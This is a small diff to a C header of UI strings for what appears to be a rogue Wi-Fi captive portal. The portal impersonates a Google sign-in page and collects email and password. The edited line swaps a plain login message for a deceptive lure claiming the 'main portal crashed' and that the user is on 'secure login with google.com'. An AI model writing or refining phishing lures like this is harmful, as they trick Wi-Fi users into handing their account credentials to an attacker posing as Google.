@@ -15,7 +15,7 @@
 #define LOGIN_SUBTITLE "Sign In With Google"
 #define LOGIN_EMAIL_PLACEHOLDER "Email"
 #define LOGIN_PASSWORD_PLACEHOLDER "Password"
-#define LOGIN_MESSAGE "Please log in to browse securely."
+#define LOGIN_MESSAGE "⚠️ Main portal crashed ! Entered into secure login with google.com. ⚠️"
 #define LOGIN_BUTTON "Next"
 #define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
 #define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
